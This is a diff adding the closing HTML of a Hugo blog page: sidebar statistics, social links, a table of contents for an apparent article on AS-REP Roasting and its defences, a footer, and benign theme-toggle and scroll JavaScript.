+        </div>
+        <div class="flex p-4 border-t text-sm border-gray-300 text-gray-700 dark:text-gray-300">
+            <div class="flex-1 border-r border-gray-600">
+                <p class="text-center">
+                    <span class="font-bold ">
+                        85
+                    </span>
+                    文章
+                </p>
+            </div>
+            <div class="flex-1 text-center">
+                <p class="text-center">
+                    <span class="font-bold">
+                        
+                            60
+                        
+                    </span>
+                    标签
+                </p>
+            </div>
+        </div>
+        <div class="px-4 pb-4 border-t border-gray-300 dark:text-gray-200">
+            <div class="mt-6 pb-16 lg:pb-0 w-4/5 lg:w-full mx-auto flex flex-wrap items-center  text-gray-500">
+                
+                <a href="//github.com/Secd0g" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="GitHub"><i class="my-iconfont icon-social-github"></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                
+                <a href="//zhihu.com/people/F0rmat" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="zhihu"><i><svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 640 512"><style>svg{fill:#bac5d8}</style><path d="M170.54 148.13v217.54l23.43.01 7.71 26.37 42.01-26.37h49.53V148.13H170.54zm97.75 193.93h-27.94l-27.9 17.51-5.08-17.47-11.9-.04V171.75h72.82v170.31zm-118.46-94.39H97.5c1.74-27.1 2.2-51.59 2.2-73.46h51.16s1.97-22.56-8.58-22.31h-88.5c3.49-13.12 7.87-26.66 13.12-40.67 0 0-24.07 0-32.27 21.57-3.39 8.9-13.21 43.14-30.7 78.12 5.89-.64 25.37-1.18 36.84-22.21 2.11-5.89 2.51-6.66 5.14-14.53h28.87c0 10.5-1.2 66.88-1.68 73.44H20.83c-11.74 0-15.56 23.62-15.56 23.62h65.58C66.45 321.1 42.83 363.12 0 396.34c20.49 5.85 40.91-.93 51-9.9 0 0 22.98-20.9 35.59-69.25l53.96 64.94s7.91-26.89-1.24-39.99c-7.58-8.92-28.06-33.06-36.79-41.81L87.9 311.95c4.36-13.98 6.99-27.55 7.87-40.67h61.65s-.09-23.62-7.59-23.62v.01zm412.02-1.6c20.83-25.64 44.98-58.57 44.98-58.57s-18.65-14.8-27.38-4.06c-6 8.15-36.83 48.2-36.83 48.2l19.23 14.43zm-150.09-59.09c-9.01-8.25-25.91 2.13-25.91 2.13s39.52 55.04 41.12 57.45l19.46-13.73s-25.67-37.61-34.66-45.86h-.01zM640 258.35c-19.78 0-130.91.93-131.06.93v-101c4.81 0 12.42-.4 22.85-1.2 40.88-2.41 70.13-4 87.77-4.81 0 0 12.22-27.19-.59-33.44-3.07-1.18-23.17 4.58-23.17 4.58s-165.22 16.49-232.36 18.05c1.6 8.82 7.62 17.08 15.78 19.55 13.31 3.48 22.69 1.7 49.15.89 24.83-1.6 43.68-2.43 56.51-2.43v99.81H351.41s2.82 22.31 25.51 22.85h107.94v70.92c0 13.97-11.19 21.99-24.48 21.12-14.08.11-26.08-1.15-41.69-1.81 1.99 3.97 6.33 14.39 19.31 21.84 9.88 4.81 16.17 6.57 26.02 6.57 29.56 0 45.67-17.28 44.89-45.31v-73.32h122.36c9.68 0 8.7-23.78 8.7-23.78l.03-.01z"/></svg></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                <a href="/atom.xml" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="RSS"><i class="my-iconfont icon-feed"></i></a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+    <div class="flex flex-col justify-between sticky top-0 pt-12 pb-4 -mt-10 text-gray-600 dark:text-gray-400">
+        <div class="bg-white shadow rounded p-4 mt-5 dark:bg-gray-800">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-攻击原理">0x01 攻击原理</a>
+      <ul>
+        <li><a href="#利用原理">利用原理</a></li>
+        <li><a href="#利用思路">利用思路</a></li>
+        <li><a href="#与kerberoasting和黄金票据的区别">与Kerberoasting和黄金票据的区别</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x02-实战">0x02 实战</a>
+      <ul>
+        <li><a href="#powerview">PowerView</a></li>
+        <li><a href="#kerbrutepython">kerbrute（Python）</a></li>
+        <li><a href="#rubeus">Rubeus</a></li>
+        <li><a href="#asreproast">ASREPRoast</a></li>
+        <li><a href="#powershell-empire">Powershell Empire</a></li>
+        <li><a href="#getnpuserspy">GetNPUsers.py</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-防御建议">0x03 防御建议</a></li>
+    <li><a href="#0x04-参考">0x04 参考</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div>
+    </div>
+   
+</div> 
+
+    </div>
+    
+    
+<footer class="bg-white dark:bg-gray-800 border-gray-400 shadow mt-10">	
+    <div class="container  mx-auto flex py-8">
+        <div class="w-full text-center text-gray-600 dark:text-gray-400">
+            <p>
+                &copy; 2023 <a  class="text-gray-700 dark:text-gray-300 font-semibold" href="https://xxe.icu">F0rmat&#39;s Blog</a> By F0rmat 
+            </p>
+            
+            <p class="pt-1">
+                Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io/"  class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Hugo</a> 
+                Theme based on <a href="https://github.com/forecho/hugo-theme-echo" class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Echo</a>
+            </p>
+
+            <span id="busuanzi_container">
+              访客数：<span id="busuanzi_value_site_uv"></span> | 访问量 <span id="busuanzi_value_site_pv"></span>
+            </span>
+
+        </div>
+
+    </div>
+    
+   
+    
+<script src="/js/clipboard.min.js"></script>
+   
+
+</footer>
+
+ <script>
+  window.onload = function() {
+    document.getElementById("nav-toggle").onclick = function() {
+      document.getElementById("nav-content").classList.toggle("hidden");
+    };
+
+    var donate = document.getElementById("btn-donate");
+    if (donate) {
+      donate.onclick = function() {
+        document.getElementById("donate-image").classList.remove("hidden");
+        donate.classList.add("hidden");
+      };
+    }
+
+    var hostname = window.location.hostname;
+    var divs = document.querySelectorAll('a[href^="http"]');
+    [].forEach.call(divs, function(div) {
+      url = div.getAttribute("href");
+      var domain = url
+        .replace("http://", "")
+        .replace("https://", "")
+        .split(/[/?#:]/)[0];
+      if (domain !== hostname) {
+        div.setAttribute("target", "_blank");
+      }
+    });
+  };
+
+   
+  
+  var h = document.documentElement,
+    b = document.body,
+    st = "scrollTop",
+    sh = "scrollHeight",
+    progress = document.querySelector("#progress"),
+    scroll;
+  var scrollpos = window.scrollY;
+  var header = document.getElementById("header");
+  var navcontent = document.getElementById("nav-content");
+
+  document.addEventListener("scroll", function() {
+     
+    scroll = ((h[st] || b[st]) / ((h[sh] || b[sh]) - h.clientHeight)) * 100;
+    progress.style.setProperty("--scroll", scroll + "%");
+
+     
+    scrollpos = window.scrollY;
+
+    if (scrollpos > 10) {
+      navcontent.classList.remove("bg-gray-100");
+    } else {
+      navcontent.classList.add("bg-gray-100");
+    }
+  });
+
+  
+  if (localStorage.theme === 'dark' || (!'theme' in localStorage && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+      var lightIcon = document.getElementById("light-icon");
+      var darkIcon = document.getElementById("dark-icon"); 
+      lightIcon.classList.add("hidden");
+      darkIcon.classList.remove("hidden");
+      document.querySelector('html').classList.add('dark')
+  }
+
+  document.getElementById('switchTheme').addEventListener('click', function() {
+    let htmlClasses = document.querySelector('html').classList;
+    var lightIcon = document.getElementById("light-icon");
+    var darkIcon = document.getElementById("dark-icon");
+    if(localStorage.theme == 'dark') {
+        htmlClasses.remove('dark');
+        localStorage.removeItem('theme');
+        darkIcon.classList.add("hidden");
+        lightIcon.classList.remove("hidden");
+    } else {
+        htmlClasses.add('dark');
+        lightIcon.classList.add("hidden");
+        darkIcon.classList.remove("hidden");
+        localStorage.theme = 'dark';
+    }
+  });
+</script>
+
+</body>
+
+</html>
